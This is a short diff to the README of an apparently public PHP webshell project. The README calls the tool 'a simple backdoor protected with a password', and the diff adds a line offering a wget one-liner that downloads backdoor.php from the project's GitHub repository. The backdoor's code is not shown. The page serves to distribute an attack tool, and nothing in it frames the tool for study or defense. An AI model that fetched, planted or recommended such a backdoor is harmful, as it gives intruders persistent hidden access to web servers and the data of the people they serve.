@@ -6,6 +6,7 @@ This is a simple backdoor protected with a password written in PHP. You can chan
  
  
 # Download :
+Here is some one liner to download it easely :
 ```bash
 wget https://raw.githubusercontent.com/NullBrunk/WebShell/main/backdoor.php  
 ```
